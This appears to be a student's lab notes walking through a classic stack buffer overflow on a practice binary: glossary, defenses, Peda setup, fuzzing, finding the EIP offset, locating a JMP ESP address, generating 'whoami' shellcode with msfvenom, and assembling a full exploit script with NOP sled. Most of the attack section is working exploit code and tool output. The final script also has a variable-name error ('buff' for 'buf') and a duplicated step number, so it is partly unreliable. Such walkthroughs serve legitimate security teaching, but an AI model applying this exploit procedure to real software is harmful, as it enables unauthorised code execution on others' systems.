# Buffer Overflow Terms
| Name | Descrition |
| - | - |
|Heap|Memory that can be allocated and deallocated|
|Stack|A contiguous section of memory used for passing arguments|
|Registers|Storage elements as close as possible to the central processing unit (CPU)|
|Instruction Pointer (IP)|a.k.a Program Counter (PC), contains the address of next instruction to be executed|
|Stack Pointer (SP)|Contains the address of the next available space on the stack|
|Base Pointer (BP)|The base of the stack|
|Function|Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient|
|Shellcode|The code that is executed once an exploit successfully takes advantage of a vulnerability|

# Buffer Overflow Defenses
-Non executable (NX) stack
-Address Space Layout Randomization (ASLR)
- Data Execution Prevention (DEP)
- Stack Canaries
- Position Independent Executable (PIE)

# Peda
Installation:
```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```
Common Commands:
```
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
```
# Exploit Testing
## Step 1. Does it take arguments?
```
./func $(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
```
## Step 2. Bash String Insertion
```
./func <<< $(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
```
The `<<<` is a way of mimicking user input in bash
## Step 3. String Insertion Via Script
You can write a python script that outputs the contents of a buffer:
```
#!/usr/bin/env python
# linbuffer.py
buffer = "A" * 50
print(buffer)
```
then we can send the input to the executable:
```
./func <<< $(./linbuffer.py)
```
Modifying the buffer size can test where a segmentation fault is, in this case a buffer of 75 yields this result:
```
student@lin-ops:~$ ./func <<< $(./linbuffer.py)
Enter a string: 
Segmentation fault (core dumped)
```
This is a result of overflowing the input buffer and overwriting the actual assembly commands
## Step 4. GDB w/ Peda
Start with `run ./func` or whatever your executable name is

Useful Commands:
- `shell` opens a linux shell that can be closed with `exit`
- `info` which gives info on various items, `info function` shows all functions
- `disass` disassembles a function specify it with (I.E: `disass getuserinput`)

Note:
- Red highlighting shows vulnerable parts of the code

Example Output:

![image](https://github.com/user-attachments/assets/fbf21eb2-20fe-4428-b41e-a3ee0160a278)

## Step 5. Override the Instruction Pointer
Run the script from step 3 in gdb with the syntax `run <<<$(./script_name)`

Example command:
```
run <<<$(./linbuffer.py)
```
Output:

![image](https://github.com/user-attachments/assets/d553aabe-d29b-441e-8f87-06b9d0a9d5ea)

This shows the buffer overflow starting at instruction at `0x41414141` because "AAAA" has overrode the EIX or instruction pointer, meaning that it points to `0x41414141` (A is ASCII 0x41)

## Step 6. Buffer Overflow

go to [wiremask.eu/tools/buffer-overflow-pattern-generator/](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to get a buffer overflow string

Put this into the script:
```
#!/usr/bin/env python

#buffer = A * 100
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
print(buffer)
```

Now run the program and grab the output:
![image](https://github.com/user-attachments/assets/11b3decb-1fb1-4f10-ab3f-299599dba69a)

Now grab the EIP, in this case it is `0x31634130`

Put this into the wiremask website and get the offset:

![image](https://github.com/user-attachments/assets/2d5e4a60-cac3-4ecc-b9c7-07762f6b38fd)

Once you have this change the script as follows:
```
#!/usr/bin/env python

buffer = "A" * 62 # the multiplier here is set to the offset before
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
eip = "BBBB" # any 4 bytes work
print(buffer + eip)
```

Now when we run this command:

![image](https://github.com/user-attachments/assets/0c9e414f-bb95-404f-a9fe-a86bb2cc47ce)

We have successfully overwritten the EIP register, this means that we can change what code is executed next

## Step 6. Finish Buffer Overflow
Setup gdb with no enviornment
```
>env - gdb ./func
(gdb) unset env COLUMNS
(gdb) unset env LINES  
(gdb) run
```
Then run:
```
info proc map
```
The result should look like:

![image](https://github.com/user-attachments/assets/225efe10-b727-4e75-b6f3-6e5a71786836)

Grab the start of the first address after the heap: `0xf7de1000` and the last address of the stack `0xffffe000`

Now run the following command in gdb with the addresses we found with `info proc map`
```
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
```
Note: `0xff, 0xe4` is looking for JMP ESP between the bounds of `0xf7de1000` to `0xffffe000`

Once we do this grab the first 4 memory addresses in this case:
```
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
...
```

Now reverse the endianness for those addresses:
```
0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
```
Note: `\x` is python syntax for hexadecimal

Add one of the addresses as the variable eip and create a nop variable with a value of 0x90
```
buffer = "A" * 62
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

nop = "\x90" * 15
eip = "\x59\x3b\xde\xf7"
print(buffer + eip + nop)
```

## Step 7. Getting the shellcode
### Via msfvenom (easier)
```
 msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
```

Run this command, the output should give python code `buf = ...`, copy all lines 
### Via msfconsole (harder)
```
$ msfconsole
msf6 > use payload/linux/x86/exec
msf6 payload(linux/x86/exec) > set CMD whoami
msf6 payload(linux/x86/exec) > generate -b '\x00' -f python
```

The output will look like this:
```
msf6 payload(linux/x86/exec) > generate -b '\x00' -f python
# linux/x86/exec - 69 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=whoami, NullFreeVersion=false
buf =  b""
buf += b"\xdb\xdb\xd9\x74\x24\xf4\xb8\x50\xb8\xe8\xa5\x5f"
buf += b"\x2b\xc9\xb1\x0b\x31\x47\x19\x83\xef\xfc\x03\x47"
buf += b"\x15\xb2\x4d\x82\xae\x6a\x37\x01\xd7\xe2\x6a\xc5"
buf += b"\x9e\x15\x1c\x26\xd2\xb1\xdd\x50\x3b\x23\xb7\xce"
buf += b"\xca\x40\x15\xe7\xca\x86\x9a\xf7\xa3\xee\xf5\x96"
buf += b"\x26\x87\x09\x0e\xea\xde\xeb\x7d\x8c"
```

# Step 8. Add the script that you want to run after the redirection
Grab the buf lines and put them into the python script like so:

```
#!/usr/bin/env python

buffer = "A" * 62

#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

buf =  b""
buf += b"\xdb\xdb\xd9\x74\x24\xf4\xb8\x50\xb8\xe8\xa5\x5f"
buf += b"\x2b\xc9\xb1\x0b\x31\x47\x19\x83\xef\xfc\x03\x47"
buf += b"\x15\xb2\x4d\x82\xae\x6a\x37\x01\xd7\xe2\x6a\xc5"
buf += b"\x9e\x15\x1c\x26\xd2\xb1\xdd\x50\x3b\x23\xb7\xce"
buf += b"\xca\x40\x15\xe7\xca\x86\x9a\xf7\xa3\xee\xf5\x96"
buf += b"\x26\x87\x09\x0e\xea\xde\xeb\x7d\x8c"

nop = "\x90" * 15
eip = "\x59\x3b\xde\xf7"
print(buffer + eip + nop + buff)
```
